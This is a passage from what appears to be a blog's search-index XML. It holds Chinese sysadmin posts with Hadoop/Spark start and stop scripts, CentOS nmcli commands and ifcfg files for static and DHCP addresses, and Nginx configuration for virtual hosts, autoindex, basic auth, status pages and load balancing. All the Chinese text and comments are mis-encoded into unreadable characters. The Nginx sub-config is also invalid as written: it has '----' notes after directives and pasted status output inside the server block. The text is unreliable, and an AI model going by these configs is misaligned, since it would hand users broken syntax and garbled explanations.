href="#äº”ã€å¯åŠ¨-åœæ­¢é›†ç¾¤" class="headerlink" title="äº”ã€å¯åŠ¨/åœæ­¢é›†ç¾¤"></a>äº”ã€å¯åŠ¨/åœæ­¢é›†ç¾¤</h2><ol><li>å¯åŠ¨è„šæœ¬ï¼ˆ<strong>start-cluster.sh</strong>ï¼‰</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m ========Start The Cluster======== \033[0m"</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m Starting Hadoop Now !!! \033[0m"</span>/opt/hadoop-2.7.3/sbin/start-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m Starting Spark Now !!! \033[0m"</span>/opt/spark-3.1.1-bin-hadoop2.7/sbin/start-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m The Result Of The Command \"jps\" :  \033[0m"</span>jps<span class="token keyword">echo</span> -e <span class="token string">"\033[31m ========END======== \033[0m"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>åœæ­¢è„šæœ¬ï¼ˆ<strong>stop-cluser.sh</strong>ï¼‰</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m ===== Stoping The Cluster ====== \033[0m"</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m Stoping Spark Now !!! \033[0m"</span>/opt/spark-3.1.1-bin-hadoop2.7/sbin/stop-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m Stopting Hadoop Now !!! \033[0m"</span>/opt/hadoop-2.7.3/sbin/stop-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m The Result Of The Command \"jps\" :  \033[0m"</span>jps<span class="token keyword">echo</span> -e <span class="token string">"\033[31m ======END======== \033[0m"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2>]]></content>
      
      
      <categories>
          
          <category> äº‘è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Spark </tag>
            
            <tag> æ¶æ„ </tag>
            
            <tag> é›†ç¾¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos/RHELç½‘ç»œé…ç½®</title>
      <link href="/post/926aba6d.html"/>
      <url>/post/926aba6d.html</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸€ã€åŸºæœ¬å‘½ä»¤"><a href="#ä¸€ã€åŸºæœ¬å‘½ä»¤" class="headerlink" title="ä¸€ã€åŸºæœ¬å‘½ä»¤"></a>ä¸€ã€åŸºæœ¬å‘½ä»¤</h3><p>æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ï¼š<strong>ip address</strong><br>é‡å¯ç½‘ç»œæœåŠ¡(ä¸ä¼šç«‹å³ç”Ÿæ•ˆ)ï¼š<strong>nmcli c reload</strong><br>å…³é—­æ‰€æœ‰æ¥å£ï¼š<strong>nmcli n off</strong><br>å¼€å¯æ‰€æœ‰æ¥å£ï¼š<strong>nmcli n on</strong><br>è·å–ç½‘ç»œè¿æ¥çŠ¶æ€ï¼š<strong>nmcli n connectivity</strong><br>none: ä¸»æœºä¸ºè¿æ¥åˆ°ä»»ä½•ç½‘ç»œ<br>portal: æ— æ³•åˆ°è¾¾å®Œæ•´çš„äº’è”ç½‘<br>limited: ä¸»æœºå·²è¿æ¥åˆ°ç½‘ç»œï¼Œä½†æ— æ³•è®¿é—®äº’è”ç½‘<br>full: ä¸»æœºè¿æ¥åˆ°ç½‘ç»œï¼Œå¹¶å…·æœ‰å®Œå…¨è®¿é—®<br>unknown: æ— æ³•æ‰¾åˆ°è¿æ¥çŠ¶æ€<br>ç«‹å³ç”Ÿæ•ˆ connectionï¼Œæœ‰ 3 ç§æ–¹æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">nmcli c up ens33nmcli d reapply ens33nmcli d connect ens33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="äºŒã€é…ç½®åŠ¨æ€-IP"><a href="#äºŒã€é…ç½®åŠ¨æ€-IP" class="headerlink" title="äºŒã€é…ç½®åŠ¨æ€ IP"></a>äºŒã€é…ç½®åŠ¨æ€ IP</h3><p>é…ç½®æ–‡ä»¶ï¼š<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code><br>æ–‡ä»¶åç§°æ˜¯ï¼š<code>ifcfg-{ç½‘å¡åç§°}</code></p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>dhcp                <span class="token comment" spellcheck="true"># DHCPè‡ªåŠ¨è·å–IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yes                <span class="token comment" spellcheck="true"># å¼€æœºè‡ªåŠ¨å¯ç”¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸‰ã€é…ç½®é™æ€-IP"><a href="#ä¸‰ã€é…ç½®é™æ€-IP" class="headerlink" title="ä¸‰ã€é…ç½®é™æ€ IP"></a>ä¸‰ã€é…ç½®é™æ€ IP</h3><p>é…ç½®æ–‡ä»¶ï¼š<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code><br>æ–‡ä»¶åç§°æ˜¯ï¼š<code>ifcfg-{ç½‘å¡åç§°}</code></p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>static           <span class="token comment" spellcheck="true"># é™æ€IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yesIPADDR<span class="token operator">=</span>9.0.0.3          <span class="token comment" spellcheck="true"># è®¾ç½®IPåœ°å€</span>NETMASK<span class="token operator">=</span>255.255.255.0   <span class="token comment" spellcheck="true"># è®¾ç½®å­ç½‘æ©ç </span>GATEWAY<span class="token operator">=</span>9.0.0.2         <span class="token comment" spellcheck="true"># è®¾ç½®ç½‘å…³</span>DNS1<span class="token operator">=</span>9.0.0.2                        <span class="token comment" spellcheck="true"># è®¾ç½®dns1</span>DNS2<span class="token operator">=</span>8.8.8.8                        <span class="token comment" spellcheck="true"># è®¾ç½®dns2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> è¿ç»´ </tag>
            
            <tag> ç½‘ç»œé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxé…ç½®</title>
      <link href="/post/ad720447.html"/>
      <url>/post/ad720447.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€å¯åŠ¨ã€åœæ­¢ã€é‡å¯"><a href="#ä¸€ã€å¯åŠ¨ã€åœæ­¢ã€é‡å¯" class="headerlink" title="ä¸€ã€å¯åŠ¨ã€åœæ­¢ã€é‡å¯"></a>ä¸€ã€å¯åŠ¨ã€åœæ­¢ã€é‡å¯</h2><h3 id="1-å¯åŠ¨"><a href="#1-å¯åŠ¨" class="headerlink" title="1. å¯åŠ¨"></a>1. å¯åŠ¨</h3><h4 id="systemctl-start-nginx"><a href="#systemctl-start-nginx" class="headerlink" title="systemctl start nginx"></a><em>systemctl start nginx</em></h4><h3 id="2-é‡å¯"><a href="#2-é‡å¯" class="headerlink" title="2. é‡å¯"></a>2. é‡å¯</h3><h4 id="systemctl-restart-nginx"><a href="#systemctl-restart-nginx" class="headerlink" title="systemctl restart nginx"></a><em>systemctl restart nginx</em></h4><h3 id="3-åœæ­¢"><a href="#3-åœæ­¢" class="headerlink" title="3. åœæ­¢"></a>3. åœæ­¢</h3><h4 id="systemctl-stop-nginx"><a href="#systemctl-stop-nginx" class="headerlink" title="systemctl stop nginx"></a><em>systemctl stop nginx</em></h4><p>_</p><h2 id="äºŒã€æŸ¥çœ‹-Nginx-çŠ¶æ€"><a href="#äºŒã€æŸ¥çœ‹-Nginx-çŠ¶æ€" class="headerlink" title="äºŒã€æŸ¥çœ‹ Nginx çŠ¶æ€"></a>äºŒã€æŸ¥çœ‹ Nginx çŠ¶æ€</h2><h3 id="1-æœåŠ¡çŠ¶æ€"><a href="#1-æœåŠ¡çŠ¶æ€" class="headerlink" title="1. æœåŠ¡çŠ¶æ€"></a>1. æœåŠ¡çŠ¶æ€</h3><h4 id="systemctl-status-nginx"><a href="#systemctl-status-nginx" class="headerlink" title="systemctl status nginx"></a><em>systemctl status nginx</em></h4><h3 id="3-ç›‘å¬çŠ¶æ€"><a href="#3-ç›‘å¬çŠ¶æ€" class="headerlink" title="3. ç›‘å¬çŠ¶æ€"></a>3. ç›‘å¬çŠ¶æ€</h3><h4 id="netstat-nplt"><a href="#netstat-nplt" class="headerlink" title="netstat -nplt"></a><em>netstat -nplt</em></h4><p>_</p><h2 id="ä¸‰ã€nginx-è™šæ‹Ÿä¸»æœº-ç«™ç‚¹-é…ç½®"><a href="#ä¸‰ã€nginx-è™šæ‹Ÿä¸»æœº-ç«™ç‚¹-é…ç½®" class="headerlink" title="ä¸‰ã€nginx è™šæ‹Ÿä¸»æœº(ç«™ç‚¹)é…ç½®"></a>ä¸‰ã€nginx è™šæ‹Ÿä¸»æœº(ç«™ç‚¹)é…ç½®</h2><h3 id="1-ä¸»é…ç½®æ–‡ä»¶-etc-nginx-nginx-conf"><a href="#1-ä¸»é…ç½®æ–‡ä»¶-etc-nginx-nginx-conf" class="headerlink" title="1. ä¸»é…ç½®æ–‡ä»¶/etc/nginx/nginx.conf"></a>1. ä¸»é…ç½®æ–‡ä»¶/etc/nginx/nginx.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true"># æŒ‡è¯¥æœåŠ¡è¿›ç¨‹ç”¨æˆ·èº«ä»½</span><span class="token keyword">user</span>  nginx<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># æŒ‡å®šå·¥ä½œè¿›ç¨‹æ•°é‡(ä¸€èˆ¬å¯¹åº”CPUæ ¸æ•°)</span><span class="token comment" spellcheck="true"># worker_processes  auto;</span><span class="token keyword">worker_processes</span>  <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># äº²æ ¸(ç‰¹å®šçš„CPUè°ƒåº¦ç‰¹å®šçš„è¿›ç¨‹ æ— éœ€åˆ‡æ¢æé«˜æ•ˆç‡)</span><span class="token comment" spellcheck="true"># worker_cpu_affinity auto;</span><span class="token keyword">worker_cpu_affinity</span> <span class="token number">0001</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># è¿›ç¨‹æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°(è¿æ¥ï¼Œæ­¤å¤„å¿…é¡»ä¿®æ”¹å†…æ ¸çš„é™åˆ¶ä¹Ÿå¿…é¡»æ”¯æŒè¯¥æ•°å€¼ï¼Œå†…æ ¸é™åˆ¶é»˜è®¤1024ï¼Œæœ€å¤§50000)</span><span class="token keyword">worker_rlimit_nofile</span> <span class="token number">1024</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># æŒ‡å®šè­¦å‘ŠåŠä»¥ä¸Šçº§åˆ«çš„ä¿¡æ¯ æ—¥å¿—æ–‡ä»¶</span><span class="token keyword">error_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log warn<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># æŒ‡å®šå­˜åœ¨è¿›ç¨‹å· çš„æ–‡ä»¶</span><span class="token keyword">pid</span>        <span class="token operator">/</span>var<span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># è¿›ç¨‹æœ€å¤§è¿æ¥æ•°</span>    <span class="token keyword">worker_connections</span>  <span class="token number">1024</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># äº‹ä»¶å¹¶å‘æœºåˆ¶(pollã€selectã€epoll) ç”¨epollæœºåˆ¶(linuxä¸‹æœ€ä½³æ–¹å¼)</span>    <span class="token keyword">use</span>  epoll<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># é˜²æ­¢æƒŠç¾¤</span>    <span class="token keyword">multi_accept</span> on<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true"># åŒ…å« æ–‡ä»¶å±æ€§ æ–‡ä»¶</span>    <span class="token keyword">include</span>       <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span>  application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># æŒ‡å®šæ—¥å¿—ä¿¡æ¯æ ¼å¼</span>    <span class="token keyword">log_format</span>  main  <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" '</span>                      <span class="token string">'$status $body_bytes_sent "$http_referer" '</span>                      <span class="token string">'"$http_user_agent" "$http_x_forwarded_for"'</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"># ä½¿ç”¨â€œmainâ€æ ¼å¼è®°å½•æ—¥å¿—åˆ°æŒ‡å®šæ–‡ä»¶</span>    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># å¼€å¯å¿«é€Ÿå‘é€æ–‡ä»¶æ–¹å¼</span>    <span class="token keyword">sendfile</span>        on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span>      on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># è¿æ¥è¶…æ—¶äº‹ä»¶</span>    <span class="token keyword">keepalive_timeout</span>  <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># å‹ç¼©ï¼ˆä¼˜åŒ–é€‰é¡¹ï¼‰</span>    <span class="token keyword">gzip</span>  on<span class="token punctuation">;</span>    <span class="token keyword">gzip_min_length</span>   2K<span class="token punctuation">;</span>    <span class="token keyword">gzip_buffers</span>      <span class="token number">4</span> 16k<span class="token punctuation">;</span>    <span class="token keyword">gzip_comp_level</span>   <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">gzip_types</span> text<span class="token operator">/</span>plain application<span class="token operator">/</span>x<span class="token operator">-</span>javascript text<span class="token operator">/</span>css application<span class="token operator">/</span>xml text<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># åŒ…å«å­é…ç½®æ–‡ä»¶</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-å­é…ç½®æ–‡ä»¶-etc-nginx-conf-d-upl-conf"><a href="#2-å­é…ç½®æ–‡ä»¶-etc-nginx-conf-d-upl-conf" class="headerlink" title="2. å­é…ç½®æ–‡ä»¶/etc/nginx/conf.d/upl.conf"></a>2. å­é…ç½®æ–‡ä»¶/etc/nginx/conf.d/upl.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true">#è™šæ‹Ÿä¸»æœº</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">#ç›‘å¬åœ¨å“ªä¸ªç«¯å£</span>    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># è™šæ‹Ÿä¸»æœºåç§°ï¼ˆç«™ç‚¹åŸŸåï¼‰</span>    <span class="token keyword">server_name</span>  bbs<span class="token punctuation">.</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#æŒ‡å®šå­—ç¬¦é›†</span>    <span class="token keyword">charset</span> utf<span class="token number">-8</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#æŒ‡å®šè®¿é—®æ—¥å¿—ä¿¡æ¯æ–‡ä»¶</span>    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>upl<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">#é€šç”¨åŒ¹é…é¡¹</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#æŒ‡å®šç«™ç‚¹æ ¹ç›®å½•&lt;èµ·å§‹ç›®å½•></span>        <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#æŒ‡å®šè‡ªåŠ¨ç´¢å¼•é¡µé¢</span>        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">#è®¾ç½®æŸä¸ªç›®å½•åˆ—å‡ºæ–‡ä»¶ä¿¡æ¯ æä¾›ä¸‹è½½</span>      <span class="token comment" spellcheck="true">#å½“ç”¨æˆ·è®¿é—®bbs.upl.com/download/ åˆ™åŒ¹é…è¯¥é¡¹</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>download<span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#åˆ—å‡ºè¯¥ç›®å½•åº•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶&lt;ç”¨äºèµ„æºä¸‹è½½></span>        <span class="token keyword">autoindex</span> on<span class="token punctuation">;</span>        <span class="token keyword">autoindex_exact_size</span> on<span class="token punctuation">;</span>        autoindex_format html<span class="token punctuation">;</span>        <span class="token keyword">autoindex_localtime</span> on<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#è´¦å·æˆæƒæ§åˆ¶</span>        <span class="token keyword">auth_basic</span>  <span class="token string">"This You Need Input Pas:"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#æŒ‡å®šæˆæƒç”¨æˆ·å¯†ç æ–‡ä»¶ æ–‡ä»¶æ ¼å¼ä¸º  user:passwd  å…¶ä¸­å¯†ç ä¸ºå¯†æ–‡å¯†ç </span>        <span class="token comment" spellcheck="true">#ç”Ÿæˆå¯†ç openssl passwd  ï¼ˆæ³¨æ„æ–°ç‰ˆæœ¬nginxåªæ”¯æŒå¯†æ–‡å¯†ç ï¼‰</span>        <span class="token keyword">auth_basic_user_file</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token operator">/</span>password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">#æŸ¥çœ‹nginxæœåŠ¡çŠ¶æ€  /NginxStatuså¹¶ä¸æ—¶ç«™ç‚¹ä¸­çš„å®é™…æ–‡ä»¶æˆ–ç›®å½•åªä½œä¸ºè®¿é—®é…ç½®localtion</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>NginxStatus <span class="token punctuation">{</span>        <span class="token keyword">stub_status</span> on<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">--</span>å¼€å¯çŠ¶æ€æŸ¥è¯¢        <span class="token keyword">access_log</span>  off<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">--</span>æŸ¥è¯¢çŠ¶æ€ä¸å†™æ—¥å¿—        <span class="token keyword">allow</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">64.1</span><span class="token punctuation">;</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">##########çŠ¶æ€ä¿¡æ¯#####################</span>        Active connections<span class="token punctuation">:</span> <span class="token number">1</span>     <span class="token operator">--</span><span class="token operator">-</span>æ´»è·ƒçš„è¿æ¥æ•°        <span class="token keyword">server</span> accepts handled requests             <span class="token number">2</span>            <span class="token number">2</span>            <span class="token number">6</span>    <span class="token operator">--</span><span class="token operator">--</span>æ¥å—è¿æ¥æ•°  å¤„ç†æˆåŠŸçš„è¿æ¥æ•°   æ¥å—è¯·æ±‚æ•°        Reading<span class="token punctuation">:</span> <span class="token number">0</span> Writing<span class="token punctuation">:</span> <span class="token number">1</span> Waiting<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">--</span><span class="token operator">-</span>è¯»å–å®¢æˆ·ç«¯çš„è¿æ¥æ•°   å“åº”æ•°æ®åˆ°å®¢æˆ·ç«¯çš„æ•°é‡  nginxå·²ç»å¤„ç†å®Œæˆæ­£åœ¨ç­‰å€™ä¸‹ä¸€æ¬¡è¯·æ±‚æŒ‡ä»¤çš„æ•°é‡    <span class="token comment" spellcheck="true">####################################</span>    <span class="token comment" spellcheck="true">#404 403é”™è¯¯é…ç½®é¡¹</span>    <span class="token keyword">error_page</span>  <span class="token number">404</span>  <span class="token number">403</span>             <span class="token operator">/</span><span class="token number">404</span><span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token number">404</span><span class="token punctuation">.</span>html <span class="token punctuation">{</span>        <span class="token keyword">root</span>  <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token operator">/</span>error<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#500 502 503 504é”™è¯¯åŒ¹é…é¡¹</span>    <span class="token comment" spellcheck="true"># redirect server error pages to the static page /50x.html</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">error_page</span>   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  <span class="token operator">/</span>50x<span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>50x<span class="token punctuation">.</span>html <span class="token punctuation">{</span>        <span class="token keyword">root</span>   <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nginx<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼š</p><ul><li>åªè¦ä¿®æ”¹è¿‡ nginx é…ç½®æ–‡ä»¶å¿…é¡»é‡å¯æœåŠ¡æ‰èƒ½ç”Ÿæ•ˆ</li><li><strong>systemctl restart nginx</strong>&nbsp; æˆ–è€…<strong>systemctl &nbsp;reload nginx</strong></li><li><strong>nginx -t</strong> &nbsp; æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•</li></ul><h2 id="å››ã€è´Ÿè½½å‡è¡¡"><a href="#å››ã€è´Ÿè½½å‡è¡¡" class="headerlink" title="å››ã€è´Ÿè½½å‡è¡¡"></a>å››ã€è´Ÿè½½å‡è¡¡</h2><p>å‚è€ƒï¼š<a href="https://docshome.gitbook.io/nginx-docs/readme/shi-yong-nginx-zuo-wei-http-fu-zai-jun-heng-qi">ä½¿ç”¨ Nginx ä½œä¸º HTTP è´Ÿè½½å‡è¡¡æœåŠ¡å™¨</a></p><h3 id="1-è´Ÿè½½å‡è¡¡æ–¹æ³•"><a href="#1-è´Ÿè½½å‡è¡¡æ–¹æ³•" class="headerlink" title="1. è´Ÿè½½å‡è¡¡æ–¹æ³•"></a>1. è´Ÿè½½å‡è¡¡æ–¹æ³•</h3><p>nginx æ”¯æŒä»¥ä¸‹è´Ÿè½½å‡è¡¡æœºåˆ¶ï¼ˆæˆ–æ–¹æ³•ï¼‰ï¼š</p><ul><li><p><strong>è½®è¯¢ï¼ˆ**<strong>round-robin*</strong>*ï¼‰</strong> - å‘é€ç»™åº”ç”¨æœåŠ¡å™¨çš„è¯·æ±‚ä»¥è½®è¯¢çš„æ–¹å¼åˆ†å‘</p></li><li><p><strong>æœ€å°‘è¿æ¥ï¼ˆ**<strong>least-connected*</strong>*ï¼‰</strong> - ä¸‹ä¸€ä¸ªè¯·æ±‚è¢«åˆ†é…ç»™å…·æœ‰æœ€å°‘æ•°é‡æ´»åŠ¨è¿æ¥çš„æœåŠ¡å™¨</p></li><li><p><strong>ip å“ˆå¸Œï¼ˆ**<strong>ip-hash*</strong>*ï¼‰</strong> - ä½¿ç”¨å“ˆå¸Œå‡½æ•°ç¡®å®šä¸‹ä¸€ä¸ªè¯·æ±‚åº”è¯¥é€‰æ‹©å“ªä¸€ä¸ªæœåŠ¡å™¨ï¼ˆåŸºäºå®¢æˆ·ç«¯çš„ IP åœ°å€ï¼‰</p></li></ul><h3 id="2-é»˜è®¤è´Ÿè½½å‡è¡¡é…ç½®"><a href="#2-é»˜è®¤è´Ÿè½½å‡è¡¡é…ç½®" class="headerlink" title="2. é»˜è®¤è´Ÿè½½å‡è¡¡é…ç½®"></a>2. é»˜è®¤è´Ÿè½½å‡è¡¡é…ç½®</h3><p>ä½¿ç”¨ nginx è¿›è¡Œè´Ÿè½½å‡è¡¡çš„æœ€ç®€å•é…ç½®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token keyword">upstream</span> myapp1 <span class="token punctuation">{</span>        <span class="token keyword">server</span> srv1<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token keyword">server</span> srv2<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token keyword">server</span> srv3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>        <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>            <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>myapp1<span class="token punctuation">;</span>        <span class="token 